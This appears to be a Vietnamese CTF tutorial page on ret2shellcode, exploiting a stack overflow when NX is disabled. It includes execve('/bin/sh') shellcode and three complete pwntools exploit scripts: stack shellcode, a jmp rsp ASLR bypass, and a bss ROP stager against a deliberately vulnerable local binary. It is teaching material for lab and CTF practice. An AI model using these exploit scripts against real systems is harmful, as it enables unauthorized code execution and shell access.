@@ -1,0 +1,452 @@
+<title>ret2shellcode</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:110px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 1 · Bài 2</div>
+    <h1>ret2shellcode</h1>
+    <p class="sub">Khi <strong>NX tắt</strong> (stack/bss thực thi được): nhét <mark>shellcode</mark> (mã máy tự viết, vd spawn shell) vào một vùng ghi được + thực thi, rồi <strong>ghi đè saved RIP = địa chỉ shellcode đó</strong>. Bài này đi <strong>số thật</strong>: shellcode vào stack/bss, biết địa chỉ, nhảy vào.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Nền tảng (Phase 1)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 NX OFF, no-PIE</span>
+      <span class="chip"><b>Cần trước:</b> <a href="stack_overflow.html" style="color:inherit">stack overflow</a>, asm</span>
+      <span class="chip"><b>Thời lượng:</b> ~45 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Shellcode</a><a href="#s4">04 Biết địa chỉ</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Điều kiện:</strong> NX tắt (<code>checksec</code> → "NX disabled" / RWX stack) → stack/bss chạy được mã.</p>
+    <p><strong>Cách:</strong> đặt <mark>shellcode</mark> (mã máy: setup rồi <code>execve("/bin/sh")</code>) vào buffer, ghi đè saved RIP = <strong>địa chỉ của buffer đó</strong>. CPU ret vào shellcode → chạy.</p>
+    <p><strong>Khó:</strong> phải biết địa chỉ buffer. No-PIE + no-ASLR stack: địa chỉ cố định (leak/gdb). ASLR stack: cần leak stack, hoặc nhét shellcode vào bss cố định (nếu RWX).</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>NX off → shellcode vào buffer, saved RIP = địa chỉ buffer. Cần biết địa chỉ đó.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Điều kiện</span>
+        <p><code>checksec</code> → <b>NX disabled</b> (hoặc RWX region trong vmmap). Có overflow tới saved RIP + biết/leak địa chỉ vùng chứa shellcode.</p></div>
+      <div class="combat-row"><span class="lab">⚡ Shellcode (pwntools)</span>
+<pre><code>context.arch = "amd64"
+sc = asm(shellcraft.sh())      <span class="c"># execve("/bin/sh") ~ 44 byte</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 Shellcode trên stack</span>
+<pre><code>payload = sc.ljust(OFF, b"\x90") + p64(buf_addr)
+<span class="c"># sc ở đầu buffer; saved RIP = địa chỉ đầu buffer (nop sled trước sc cũng OK)</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 Shellcode trong bss (RWX)</span>
+<pre><code># G1: read(0, bss, len) ghi sc vào bss ; G2: saved RIP = bss
+# bss cố định (no-PIE) → khỏi leak stack</code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Bẫy</span>
+        <p>Địa chỉ stack đổi do ASLR → leak hoặc dùng bss. NOP sled (<code>\x90</code>) tăng dung sai địa chỉ. Shellcode có null byte bị cắt nếu input dùng scanf %s (xem <a href="shellcode_advanced.html">shellcode nâng cao</a>).</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>NX &amp; shellcode</h2>
+  <p><span class="mem-term">NX</span> (No-eXecute, còn gọi DEP) đánh dấu stack/heap/bss <strong>không thực thi</strong> — CPU từ chối chạy mã ở đó. Khi NX <em>tắt</em> (binary cũ, hoặc compile <code>-z execstack</code>), các vùng data chạy được mã. <span class="mem-term">Shellcode</span> là một đoạn mã máy nhỏ ta tự viết (thường để <code>execve("/bin/sh",0,0)</code> mở shell). ret2shellcode = đặt shellcode vào vùng chạy được rồi điều hướng CPU tới đó.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">NX / DEP</div><p>Cấm thực thi vùng data.</p></div>
+    <div class="card"><div class="term">shellcode</div><p>Mã máy tự viết (spawn shell…).</p></div>
+    <div class="card"><div class="term">shellcraft</div><p>pwntools sinh shellcode.</p></div>
+    <div class="card"><div class="term">NOP sled</div><p>Chuỗi \x90 tăng dung sai địa chỉ.</p></div>
+    <div class="card"><div class="term">RWX</div><p>Vùng vừa ghi vừa chạy được.</p></div>
+    <div class="card"><div class="term">execstack</div><p>Cờ compile bật stack chạy được.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Kỹ thuật "cổ điển" nhất</h2>
+  <p>Trước khi NX phổ biến (~2004), ret2shellcode là <em>cách khai thác chính</em>: nhét code vào stack rồi chạy. NX ra đời chặn nó → sinh ra ROP/ret2libc. Nhưng ret2shellcode vẫn gặp ở: binary cũ, đề cố tình tắt NX, hoặc sau khi <a href="ret2syscall_mprotect.html">mprotect</a> bật RWX một vùng. Hiểu nó là hiểu "chạy code mới" — nền tảng để đối chiếu với "tái dùng code" (ROP).</p>
+ </div>
+</section>
+
+<!-- 03 Shellcode -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / SHELLCODE · MỤC LÕI</div>
+  <h2>execve("/bin/sh") — byte thật</h2>
+  <pre><code><span class="c"># shellcraft.sh() biên dịch (asm) ra ~44 byte:</span>
+<span class="d">31 f6</span>               xor    esi, esi          <span class="c"># argv = 0</span>
+<span class="d">56</span>                  push   rsi
+<span class="d">48 bf 2f 62 69 6e</span>   movabs rdi, "/bin//sh"      <span class="c"># "/bin/sh"</span>
+...
+<span class="d">6a 3b</span>               push   <span class="d">0x3b</span>             <span class="c"># 59 = execve</span>
+<span class="d">58</span>                  pop    rax
+<span class="d">0f 05</span>               syscall                   <span class="c"># execve("/bin/sh",0,0)</span></code></pre>
+  <h3>Bố cục payload (shellcode trên stack, số thật)</h3>
+  <div class="frame">
+    <div class="fr key"><span class="o">0x00</span><span>shellcode (44 byte) — <code>asm(shellcraft.sh())</code></span></div>
+    <div class="fr"><span class="o">0x2c–0x47</span><span>b"\x90"*padding (NOP) tới OFF=72</span></div>
+    <div class="fr key"><span class="o">0x48 (OFF)</span><span><code>p64(buf_addr)</code> = <code>0x7fffffffe2a0</code> → saved RIP = đầu buffer</span></div>
+  </div>
+  <div class="note tip"><span class="tag">NOP sled</span>Nếu địa chỉ buffer không chắc chắn (hơi lệch), đặt một dải <code>\x90</code> (NOP) TRƯỚC shellcode và trỏ saved RIP vào giữa sled → CPU "trượt" qua NOP tới shellcode. Tăng dung sai khi địa chỉ hơi random.</div>
+ </div>
+</section>
+
+<!-- 04 Biết địa chỉ -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / BIẾT ĐỊA CHỈ SHELLCODE</div>
+  <h2>Ba tình huống</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>No-PIE + bss RWX</h4><p>Ghi shellcode vào bss (địa chỉ cố định, vd <code>0x404080</code>), nhảy tới đó. KHÔNG cần leak. Dễ nhất.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Stack, ASLR tắt</h4><p>Địa chỉ buffer cố định (gdb/leak 1 lần). Nhảy thẳng. (Đề thường tắt ASLR local để luyện.)</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Stack, ASLR bật</h4><p>Cần <a href="leak_techniques.html">leak địa chỉ stack</a> (fmt/__environ) trước, rồi nhảy. Hoặc dùng <code>jmp rsp</code> gadget (rsp trỏ ngay sau RIP = shellcode).</p></div></div>
+  <div class="note warn"><span class="tag">jmp rsp trick</span>Nếu có gadget <code>jmp rsp</code> (hoặc <code>call rsp</code>) trong binary: saved RIP = gadget đó; ngay sau saved RIP đặt shellcode. Khi ret vào gadget → <code>jmp rsp</code> nhảy tới shellcode (rsp trỏ ngay sau RIP) → <strong>khỏi cần biết địa chỉ stack</strong>! Rất hay khi ASLR.</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Dựng payload ret2shellcode</h2>
+  <p>Chọn nơi đặt shellcode → xem payload hình thành.</p>
+  <div class="lab">
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px" id="pick">
+      <button data-p="0" class="active" style="font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--accent);color:#fff;padding:8px 13px;border-radius:9px;cursor:pointer">shellcode trên STACK</button>
+      <button data-p="1" style="font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px;cursor:pointer">shellcode trong BSS (RWX)</button>
+      <button data-p="2" style="font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px;cursor:pointer">jmp rsp (ASLR)</button>
+    </div>
+    <pre id="builder"></pre>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>NX, địa chỉ, gadget</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>NX off?</h4>
+    <pre><code><span class="p">$</span> checksec ./vuln   <span class="c"># "NX disabled" hoặc vmmap có rwx</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Địa chỉ buffer/bss</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> p $rsp        <span class="c"># địa chỉ stack buffer (ASLR off)</span>
+<span class="p">&gt;&gt;&gt;</span> exe.bss(<span class="d">0x80</span>)     <span class="c"># bss nếu RWX</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>jmp rsp gadget</h4>
+    <pre><code><span class="p">$</span> ROPgadget --binary ./vuln | grep "jmp rsp"</code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>ret2shellcode (NX off)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie -z execstack</span>
+<span class="k">int</span> main(){ <span class="k">char</span> buf[<span class="d">0x40</span>]; read(<span class="d">0</span>, buf, <span class="d">0x100</span>); }   <span class="c">// NX off, overflow</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · stack (ASLR off)</button>
+    <button class="tab" data-t="b">B · jmp rsp (ASLR)</button>
+    <button class="tab" data-t="c">C · bss RWX</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — shellcode trên stack, địa chỉ buffer cố định (ASLR off).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF = <span class="d">72</span>
+buf_addr = <span class="d">0x7fffffffe2a0</span>        <span class="c"># địa chỉ buffer (gdb, ASLR off)</span>
+sc = asm(shellcraft.sh())         <span class="c"># 44 byte execve("/bin/sh")</span>
+
+payload  = sc.ljust(OFF, b<span class="s">"\x90"</span>)   <span class="c"># shellcode + NOP pad tới OFF</span>
+payload += p64(buf_addr)          <span class="c"># saved RIP = đầu buffer</span>
+p.sendline(payload)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span><code>buf_addr=0x7fffffffe2a0</code> là địa chỉ stack khi ASLR OFF (gdb). ASLR ON → địa chỉ đổi mỗi lần → dùng bản B (jmp rsp) hoặc leak stack. OFF=72 dò cyclic.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — jmp rsp: KHÔNG cần biết địa chỉ stack (vượt ASLR).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF = <span class="d">72</span>
+jmp_rsp = <span class="k">next</span>(exe.search(asm(<span class="s">"jmp rsp"</span>)))   <span class="c"># gadget jmp rsp</span>
+sc = asm(shellcraft.sh())
+
+payload  = b<span class="s">"A"</span>*OFF
+payload += p64(jmp_rsp)            <span class="c"># saved RIP = jmp rsp</span>
+payload += sc                     <span class="c"># shellcode NGAY SAU RIP (rsp trỏ đây)</span>
+p.sendline(payload)
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Vượt ASLR</span><code>jmp rsp</code> nhảy tới <code>[rsp]</code> = ngay sau saved RIP = nơi ta đặt shellcode. Vì tương đối (không cần địa chỉ tuyệt đối) → <b>bỏ qua ASLR stack</b>. Cần binary có gadget <code>jmp rsp</code> (<code>\xff\xe4</code>) &amp; NX off.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — shellcode trong bss RWX (địa chỉ cố định no-PIE).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+OFF = <span class="d">72</span>; bss = exe.bss(<span class="d">0x80</span>)       <span class="c"># 0x404080 (RWX nếu execstack)</span>
+sc = asm(shellcraft.sh())
+<span class="c"># G1: read(0, bss, len) ghi sc ; G2: ret vào bss</span>
+r = ROP(exe); r.read(<span class="d">0</span>, bss, <span class="k">len</span>(sc)); r.raw(bss)
+p.sendline(b<span class="s">"A"</span>*OFF + r.chain())
+p.send(sc)
+p.interactive()</code></pre>
+<div class="note"><span class="tag">bss cố định</span>bss no-PIE cố định → khỏi leak. Chỉ chạy nếu bss RWX (execstack thường làm cả bss chạy được). Nếu không RWX → <a href="ret2syscall_mprotect.html">mprotect</a> trước.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Crash tại shellcode</h4><p>NX chưa tắt (SIGSEGV exec). checksec; mprotect nếu cần.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Địa chỉ sai (ASLR)</h4><p>Dùng jmp rsp hoặc leak stack.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Shellcode có null bị cắt</h4><p>scanf %s dừng null. read OK. Hoặc shellcode no-null (xem shellcode_advanced).</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">checksec</div><h4>NX?</h4><p>"NX disabled".</p></div>
+    <div class="card"><div class="term">shellcraft</div><h4>Shellcode</h4><p><code>sh()</code>, <code>cat()</code>.</p></div>
+    <div class="card"><div class="term">ROPgadget</div><h4>jmp rsp</h4><p>Gadget vượt ASLR.</p></div>
+    <div class="card"><div class="term">gdb vmmap</div><h4>RWX region</h4><p>Vùng chạy được.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi shellcode không chạy</h2>
+  <div class="grid">
+    <div class="card"><h4>NX chưa tắt</h4><p>SIGSEGV tại shellcode. checksec; mprotect.</p></div>
+    <div class="card"><h4>Địa chỉ sai</h4><p>ASLR. jmp rsp / leak / NOP sled.</p></div>
+    <div class="card"><h4>Null byte cắt</h4><p>read OK; scanf %s cắt. Dùng shellcode no-null.</p></div>
+    <div class="card"><h4>Shellcode sai arch</h4><p>context.arch = "amd64" vs "i386".</p></div>
+    <div class="card"><h4>Buffer quá nhỏ</h4><p>Shellcode không vừa. Dùng bss hoặc stager.</p></div>
+    <div class="card"><h4>bss không RWX</h4><p>mprotect trước, hoặc dùng stack.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & KIẾN TRÚC</div>
+  <h2>Khi có ràng buộc</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Tình huống</th><th>Giải pháp</th></tr></thead>
+    <tbody>
+      <tr><td>NX on</td><td><a href="ret2syscall_mprotect.html">mprotect</a> bật RWX trước, rồi ret2shellcode</td></tr>
+      <tr><td>ASLR stack</td><td>jmp rsp / leak stack / bss</td></tr>
+      <tr><td>Input lọc byte (isalnum)</td><td><a href="shellcode_advanced.html">alphanumeric shellcode</a></td></tr>
+      <tr><td>Buffer nhỏ</td><td><a href="shellcode_advanced.html">stager / egg-hunter</a></td></tr>
+      <tr><td>seccomp cấm execve</td><td><a href="seccomp_orw.html">ORW shellcode</a></td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>shellcode i386 khác (int 0x80, eax=11 execve). <code>context.arch="i386"</code>. jmp esp (<code>\xff\xe4</code>) tương tự.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐ · stack ASLR off</div><p>shellcode vào buffer, nhảy địa chỉ cố định.</p></div>
+  <div class="ex"><div class="level">⭐⭐ · jmp rsp</div><p>ASLR on, dùng gadget jmp rsp.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · bss + read</div><p>Ghi shellcode vào bss RWX, ret vào.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">ret2shellcode</div><p>Nhảy vào shellcode ta đặt.</p></div>
+    <div class="card"><div class="term">NX / DEP</div><p>Cấm thực thi data.</p></div>
+    <div class="card"><div class="term">shellcode</div><p>Mã máy spawn shell.</p></div>
+    <div class="card"><div class="term">NOP sled</div><p>\x90 tăng dung sai.</p></div>
+    <div class="card"><div class="term">jmp rsp</div><p>Nhảy tương đối, vượt ASLR.</p></div>
+    <div class="card"><div class="term">RWX</div><p>Vùng ghi+chạy được.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="stack_overflow.html">stack_overflow</a>. Nâng cao: <a href="shellcode_advanced.html">shellcode_advanced</a> · <a href="seccomp_orw.html">seccomp_orw</a>. Khi NX on: <a href="ret2syscall_mprotect.html">mprotect</a>.</li>
+    <li>pwntools shellcraft docs · Aleph One "Smashing The Stack".</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 1 · Bài 2.</strong> NX off → shellcode vào buffer/bss, saved RIP = địa chỉ đó. ASLR → jmp rsp hoặc leak. Nền "chạy code mới" đối lập ROP "tái dùng code". Tiếp theo: integer bugs.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
